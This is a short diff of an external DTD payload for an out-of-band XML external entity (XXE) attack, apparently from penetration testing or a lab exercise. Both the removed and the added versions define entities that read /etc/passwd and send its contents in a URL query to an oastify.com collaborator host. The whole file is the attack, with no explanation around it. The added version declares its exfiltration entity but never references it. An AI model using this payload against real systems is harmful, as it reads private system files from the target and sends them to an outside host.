@@ -1,4 +1,3 @@
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://oa2cvqwuq26ny2gljc4cba8rwi29q6ev.oastify.com/?x=%file;'>">
-%eval;
-%exfiltrate;
+<!ENTITY % data SYSTEM "file:///etc/passwd">
+<!ENTITY % param "<!ENTITY exfil SYSTEM 'https://5qwv2o8z86wg3wk56ggkajncc3iu6quf.oastify.com/exfil?data=%data;'>">
+%param;
